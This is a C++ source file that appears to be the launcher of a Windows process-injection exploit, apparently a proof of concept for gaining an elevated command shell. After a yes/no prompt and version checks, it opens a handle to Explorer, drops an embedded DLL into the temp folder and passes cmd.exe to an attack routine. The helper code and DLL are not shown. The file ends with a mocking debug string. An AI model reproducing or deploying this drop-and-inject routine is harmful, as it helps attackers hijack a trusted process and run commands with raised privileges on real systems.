/*++

Module Name:

	main.cpp

Abstract:

	This file contains program entry point.

--*/
#include "global.h"

#ifdef _WIN64
#include "dll64.h"
#define INJECTDLL dll64
#else
#include "dll32.h"
#define INJECTDLL dll32
#endif

#pragma comment(linker,"/MERGE:.rdata=.~PRISM")

PROGRAM_CONTEXT g_ctx;

void __cdecl main()
{
	WCHAR szCmd[BUFFER_LENGTH];
	WCHAR szDropDllPath[BUFFER_LENGTH];
	WCHAR szArgs[MAX_PATH];
	WCHAR szDir[MAX_PATH];

	PFNRtlGetVersion pRtlGetVersion;
	RTL_OSVERSIONINFOW osver;
	 
	DWORD dwRes = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	
	if (MessageBoxW(GetForegroundWindow(), INFOSTRING, PROGRAMTITLE, MB_YESNO | MB_ICONQUESTION) == IDNO)
		ExitProcess(3);

	__try {
		pRtlGetVersion = (PFNRtlGetVersion)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
		if (pRtlGetVersion) {
			RtlSecureZeroMemory(&osver, sizeof(osver));
			osver.dwOSVersionInfoSize = sizeof(osver);
			if (pRtlGetVersion(&osver) >= 0) {
				if (osver.dwBuildNumber < 7000) {
					MessageBoxW(GetForegroundWindow(), UNSUPPORTEDSTRING, PROGRAMTITLE, MB_ICONINFORMATION);
					ExitProcess(4);
				}
			}
			else ExitProcess(5);
		}
		else ExitProcess(6);

#ifndef _WIN64
		if (IsWow64()) {
			MessageBoxW(GetForegroundWindow(), WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
			ExitProcess(7);
		}
#endif

		g_ctx.hRemoteProcess = GetExplorerHandle();
		if (g_ctx.hRemoteProcess == NULL) {
			MessageBoxW(GetForegroundWindow(), L"Target process handle is NULL", PROGRAMTITLE, MB_ICONINFORMATION);
			__leave;
		}

		RtlSecureZeroMemory(szCmd, BUFFER_LENGTH);
		RtlSecureZeroMemory(szDropDllPath, BUFFER_LENGTH);
		RtlSecureZeroMemory(szArgs, MAX_PATH);
		RtlSecureZeroMemory(szDir, MAX_PATH);

		GetSystemDirectoryW(g_ctx.szSystemDirectory, MAX_PATH);
		wsprintfW(szCmd, L"%ws\\cmd.exe", g_ctx.szSystemDirectory);
		wsprintfW(szDir, L"%ws", g_ctx.szSystemDirectory);

		dwRes = GetTempPathW(MAX_PATH, szDropDllPath);
		if (dwRes > 0) {
			lstrcatW(szDropDllPath, TARGETDLL);

			hFile = CreateFileW(szDropDllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
			if (hFile == INVALID_HANDLE_VALUE) __leave;

			WriteFile(hFile, INJECTDLL, sizeof(INJECTDLL), &dwRes, NULL);
			CloseHandle(hFile);
		}
		AttempOperation(szCmd, szArgs, szDir, szDropDllPath);
	}
	__finally {
		if (g_ctx.hRemoteProcess != NULL) CloseHandle(g_ctx.hRemoteProcess);
	}
	OutputDebugStringW(L"Kim Chen In was here drinking vodka with KGB on Iranian ICBM full of Chinese hackers with flag of Al-Kaeda and ISIS, all died because of Ebola");
}